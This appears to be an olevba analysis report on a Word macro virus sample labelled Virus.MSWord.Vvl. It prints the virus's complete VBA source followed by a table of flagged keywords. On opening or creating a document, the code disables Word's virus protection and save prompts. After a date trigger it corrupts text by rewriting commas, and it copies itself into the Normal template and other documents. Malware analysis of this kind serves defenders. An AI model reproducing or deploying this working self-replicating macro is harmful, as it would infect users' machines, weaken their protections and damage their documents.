olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vvl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vvl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim IsNew
Private Sub Document_Open()
'
'Lvv
'v 1.3
On Error Resume Next
Application.EnableCancelKey = 0
With Options:
.ConfirmConversions = False
.SaveNormalPrompt = False
.VirusProtection = False
End With
If (Date > #8/31/02#) Then
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=", áëÿ, ", ReplaceWith:=",", _
Replace:=wdReplaceAll
myRange.Find.Execute FindText:=",", ReplaceWith:=", áëÿ, ", _
Replace:=wdReplaceAll
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'Lvv" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
NormalTemplate.Save
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'Lvv" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
End If
If (IsNew) Then ActiveDocument.Save
End Sub
Private Sub Document_New()
IsNew = False
Call Document_Open
IsNew = True
End Sub































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

